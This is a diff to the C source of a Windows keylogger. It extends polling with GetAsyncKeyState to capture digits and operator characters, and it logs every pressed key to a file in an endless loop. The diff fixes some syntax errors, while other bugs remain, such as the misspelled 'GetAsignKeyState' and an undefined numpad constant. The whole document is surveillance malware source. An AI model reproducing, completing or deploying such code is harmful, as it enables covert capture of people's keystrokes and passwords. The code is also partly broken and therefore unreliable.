@@ -18,13 +18,21 @@ char minusArr[] = {
 };
 
 char numsArr[] = {
-'0','1','2','3','4','5','6','7','8','9'      
-}
+'0','1','2','3','4','5','6','7','8','9'
+};
+
+char operatorsArr[] = {'+', '-', '*', '/', '%', '='
+};
+
 
 while(1){
+    
  int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]); // MayusArray Length
  int minusArrLen = sizeof(minusArr) / sizeof(minusArr[0]); // MinusArray Lenght
  int numsArrLen = sizeof(numsArr) / sizeof(numsArr[0]); // Numerical chars
+ int operatorsArrLen = sizeof(operatorsArr) / sizeof(operatorsArr[0]);
+
+
  for(int x = 0; x<mayusArrLen;x++){
  if(GetAsyncKeyState(mayusArr[x]) & 0x8000){
   fprintf(f,"%c",mayusArr[x]);
@@ -36,10 +44,30 @@ while(1){
    fflush(f);
   }
  }
- for(int z = 0; z<numsArrLen;z++)
- if(GetAsyncKeyState(VK_NUMPAD+z) & 0x8000) //Numpad Keys
+ for(int z = 0; z<numsArrLen;z++)//Numpad Keys
+ if(GetAsyncKeyState(VK_NUMPAD+z) & 0x8000){
   fprintf(f,"%c",numsArr[z])
-  ffush(f);
-}
+  fflush(f);
+  }
+ }
+ for(int x = 0 ; x<numsArrLen;x++){
+ if(GetAsyncKeyState(numsArr[x])){
+  fprintf(f,"%c",numsArr[x]);
+  fflush(f);
+  }
+ }
+ for(int l = 0;l<operatorsArrLen;l++){ 
+  if(GetAsignKeyState(operatorsArr[l])){
+   fprintf(f, "%c",operatorsArr[l]);
+   fflush(f);
+  }
+ }
+
+
+
+
+
+
+
 }//END WHILE
 }//END MAIN
